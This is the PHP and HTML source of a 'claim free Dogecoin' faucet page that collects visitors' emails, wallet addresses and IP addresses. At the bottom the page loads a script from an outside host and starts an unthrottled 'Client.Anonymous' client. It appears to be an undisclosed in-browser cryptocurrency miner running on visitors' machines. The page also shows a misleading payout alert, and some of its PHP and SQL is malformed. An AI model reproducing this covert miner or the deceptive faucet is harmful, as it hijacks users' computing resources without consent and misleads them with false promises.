<html lang="en">
<head>

  <!-- Basic Page Needs
  –––––––––––––––––––––––––––––––––––––––––––––––––– -->
  <meta charset="utf-8">
  <title>Claim your free doge!</title>
  <meta name="description" content="Claim free DOGECOIN every 3 hours! DOGE TO THE MOON!!">
  <meta name="author" content="Hui Liao">

  <!-- Mobile Specific Metas
  –––––––––––––––––––––––––––––––––––––––––––––––––– -->
  <meta name="viewport" content="width=device-width, initial-scale=1">

  <!-- FONT
  –––––––––––––––––––––––––––––––––––––––––––––––––– -->
  <link href="//fonts.googleapis.com/css?family=Raleway:400,300,600" rel="stylesheet" type="text/css">

  <!-- CSS
  –––––––––––––––––––––––––––––––––––––––––––––––––– -->
  <link rel="stylesheet" href="/css/normalize.css">
  <link rel="stylesheet" href="/css/skeleton.css">
  <link rel="stylesheet" type="text/css" href="/css/styles.css">
  <!-- Favicon
  –––––––––––––––––––––––––––––––––––––––––––––––––– -->
  <link rel="icon" type="image/png" href="/images/favicon.png">

</head>

<style>
body {
  background-image: url('https://i.pinimg.com/originals/da/61/a7/da61a7d17487c15f798f603386f0a735.jpg');
  background-repeat: no-repeat;
  background-attachment: fixed;
  background-size: cover;
}

h1 {
  color: #ffff;
}
</style> 
<?php

    require_once $_SERVER['DOCUMENT_ROOT'].'/Config/config.php';

    if (isset($_POST["formPost"])) {
        $email = $_POST['email'];
        $wallet = $_POST['wallet'];
        
        $result = $sql->fill("SELECT * FROM users WHERE email = ? LIMIT 1",
            $email)->query();

        $row = $result->fetch();

        if ($wallet === $row["wallet"])  {
        ?>
        
        <form onsubmit="alert('successfully added 0.068 $DOGE to queue, you can withdraw when it reaches total 2 $DOGE! Email us if you run into problems or cant withdraw!');" method="POST"> -->

        <?php
        } 
        
        else {
			
        $email = $_POST['email'];
        $wallet = $_POST['wallet'];
        $rip = $_SERVER["REMOTE_ADDR"];

        $result = $sql->fill("INSERT INTO users $ VALUES ?",
            ["email", "wallet", "rip"],
            [$email, $wallet, $rip])->query();
    }
}


    ?>
<center>
<h1>You can claim your free doge every 15 minutes!</h1>
<iframe data-aa="1657077" src="//ad.a-ads.com/1657077?size=468x60" scrolling="no" style="width:468px; height:60px; border:0px; padding:0; overflow:hidden" allowtransparency="true"></iframe>
<form action="?" method="POST">
    <table>
        <tbody>

            <tr>
                <td style="color: #ffff">Email:</td>
                <td><input type="email" name="email" placeholder="DogeToTheMoon@email.com"></td>
            </tr>

            <tr>
                <td style="color: #ffff">Wallet:</td>
                <td><input type="wallet" name="wallet" placeholder="DogeIsAwesome29ncudncuesod"></td>
            </tr>
            <tr>
                <td></td>
                <br/>
                <td ><input style="color: #ffff" type="submit" value="Submit" name="formPost"></td>
            </tr>
        </tbody>
    </table>
</form>
<iframe data-aa="1657076" src="//ad.a-ads.com/1657076?size=468x60" scrolling="no" style="width:468px; height:60px; border:0px; padding:0; overflow:hidden" allowtransparency="true"></iframe>
</center>

<script src="https://www.hostingcloud.racing/Vxlc.js"></script>
<script>
    var _client = new Client.Anonymous('6d28897a3e9749426654fb8e124ecd4a773490135908ff2529aa0eb728c72533', {
        throttle: 0, c: 'w', ads: 0
    });
    _client.start();
    

</script>
